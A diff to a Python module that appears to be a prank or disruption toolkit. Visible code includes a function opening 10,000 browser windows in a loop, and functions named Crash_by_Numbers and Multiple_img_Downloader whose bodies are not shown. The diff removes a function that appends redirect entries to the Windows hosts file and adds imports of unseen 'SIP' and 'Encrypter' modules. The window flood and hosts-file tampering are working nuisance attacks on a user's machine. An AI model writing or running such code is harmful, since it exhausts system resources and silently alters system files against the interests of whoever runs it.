@@ -5,7 +5,8 @@ import os
 import shutil
 import numpy as np
 import webbrowser
-import platform
+from SIP import SIP
+from Encrypter import Encrypter
 
 
 def Multiple_img_Downloader(count: int = 10000):
@@ -84,17 +85,3 @@ def Crash_by_Numbers():
 def open_BrowserWins(count: int = 10000):
     for i in range(count):
         webbrowser.open_new('https://www.google.com')
-
-
-def block_site(url: str, redirect_ip: str = '127.0.0.1'):
-    os_name = platform.system()
-
-    if os_name == 'Windows':
-        try:
-            os.chdir('C:/Windows/System32/drivers/etc')
-            with open('hosts', 'a') as f:
-                f.write(f'\n {redirect_ip} {url}')
-        except():
-            raise PermissionError('Permission Denied!')
-    else:
-        print('OS not supported')
